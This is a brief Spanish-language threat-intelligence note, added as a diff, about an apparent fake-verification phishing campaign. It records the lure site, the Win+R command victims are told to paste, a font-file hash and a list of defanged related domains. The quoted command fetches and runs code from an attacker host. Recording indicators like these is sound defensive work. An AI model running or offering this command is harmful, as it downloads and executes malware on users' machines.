@@ -1,0 +1,42 @@
+1-  URL incial:
+https://axetrade-capital[.]com
+
+2-  hace llamado a ejecutar el sigueinte comando mediante el Win+R
+
+Cmd.exe c/ start "" /min cmd /k "curl -s https://dropthefile[.]com/cloudflare cmd.exe/c start cmd && exit" Security Code: 8352
+
+
+3-  Archivo identificado dentro del sitio inicial axetrade-capital.com
+
+use.fontawesome[.]com/releases/v5.0.0/webfonts/fa-brands-400.woff2
+Hash de archivo descargado /fa-brands-400.woff2
+45E39853C41558C4922FF1B0895547A99E378F136EC3D9D2F4DF15CC269485FA
+
+
+Identificacion de otros dominos bajo el mismo font de archivo en los ultimos 30 días:
+
+axetrade-capital[.]com/
+101[.]32[.]40[.]22/
+generali-fx[.]com/
+www[.]oversixty[.]com[.]au/finance/legal/police-appeal-for-information-after-baby-sea[.][.][.]
+access-ssa-gov[.]es/us/
+pumpfunaaexposed[.]pages[.]dev/
+www[.]empresaactiva[.]com/search?mode=all&orderby=_score&query=Idris+Mootee&option=[.][.][.]
+zfbezhefbzhbdfbzdufbuzbdf[.]pages[.]dev/
+angelica[.]ne[.]jp/
+upwardstrend[.]net/
+protectrug[.]com/
+cptch[.]pages[.]dev/robots[.]txt
+renewdeltecareusa[.]com/
+www[.]ss-courses[.]xyz/
+bitcointransfers[.]net/transaction2371[.]html
+www[.]mag[.]co[.]id/
+www[.]inmobiliariagrupogemar[.]com/
+www[.]fizmofx-markets[.]com/
+asic-sa[.]com/
+tools-booster[.]com/
+tradewithbridges[.]net/
+mail[.]tradewithbridges[.]net/
+ledger[.]ftp4cbc[.]com/
+
+
